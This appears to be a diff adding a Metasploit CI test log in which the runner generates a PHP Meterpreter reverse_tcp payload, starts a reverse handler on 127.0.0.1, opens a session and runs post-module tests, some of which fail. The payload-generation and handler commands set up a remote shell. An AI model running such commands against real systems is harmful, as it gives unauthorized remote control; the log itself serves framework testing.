@@ -1,0 +1,28 @@
+use php/meterpreter/reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220124-3356-injftj.php -f raw lport=6037 lhost=127.0.0.1
+[-] FAILED: should list users
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Testing complete in 300.0463094
+[*] Passed: 1; Failed: 0
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> to_handler
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Writing 1110 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220124-3356-ti7t0v.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Killing all sessions...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Writing 1110 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220124-3356-injftj.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> [*] Payload Handler Started as Job 34
+[4mmsf6[0m payload([1m[31mphp/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6037 
+[*] Sending stage (39282 bytes) to 127.0.0.1
+[*] Meterpreter session 36 opened (127.0.0.1:6037 -> 127.0.0.1:50177 ) at 2022-01-24 01:15:42 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=36 addentropy=true verbose=true
+
+[*] Loading extapi extension...
+[-] Post failed: Rex::Post::Meterpreter::ExtensionLoadError The "extapi" extension is not supported by this Meterpreter type (php/windows)
+[-] Call stack:
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/extapi.rb:32:in `setup'
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> 
